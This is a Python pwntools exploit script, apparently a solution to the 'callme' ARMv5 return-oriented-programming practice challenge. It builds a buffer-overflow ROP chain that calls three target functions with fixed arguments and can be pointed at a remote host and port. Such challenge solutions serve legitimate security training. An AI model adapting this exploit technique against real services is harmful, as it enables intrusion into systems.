from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./callme_armv5")


class ROPS:
    big_pop = 0x00010870  # pop {r0, r1, r2, lr, pc}; 


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROPS.big_pop,
        0xDEADBEEF,
        0xCAFEBABE,
        0XD00DF00D,
        ROPS.big_pop,
        elf.sym.callme_one,
        0xDEADBEEF,
        0xCAFEBABE,
        0XD00DF00D,
        ROPS.big_pop,
        elf.sym.callme_two,
        0xDEADBEEF,
        0xCAFEBABE,
        0XD00DF00D,
        elf.plt.exit,
        elf.sym.callme_three,
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()